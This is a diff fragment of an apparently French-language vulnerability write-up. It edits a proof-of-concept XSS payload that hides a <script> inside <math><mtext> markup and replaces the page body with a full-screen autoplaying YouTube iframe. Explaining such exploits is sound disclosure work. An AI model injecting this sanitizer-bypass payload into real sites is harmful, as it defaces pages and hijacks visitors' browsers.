@@ -45,11 +45,18 @@ Pour exploiter cette vulnérabilité, un attaquant pourrait suivre les étapes s
    ```html
    <math>
        <mtext>
-           <script>
-               document.body.innerHTML = '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background-color:black;z-index:9999;display:flex;align-items:center;justify-content:center;">
-               <iframe src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1&amp;loop=1" style="width:80%;height:80%;border:none;"></iframe>
-               </div>';
-           </script>
+         <script>
+            document.body.innerHTML = `
+               <div style="position:fixed; top:0; left:0; width:100%; height:100%; background-color:black; z-index:9999; display:flex; align-items:center; justify-content:center;">
+                     <iframe
+                        src="https://www.youtube.com/embed/W73uReoG3UU?autoplay=1&loop=1"
+                        style="width:80%; height:80%; border:none;"
+                        allow="autoplay; encrypted-media"
+                        allowfullscreen>
+                     </iframe>
+               </div>
+            `;
+         </script>
        </mtext>
    </math>
    ```
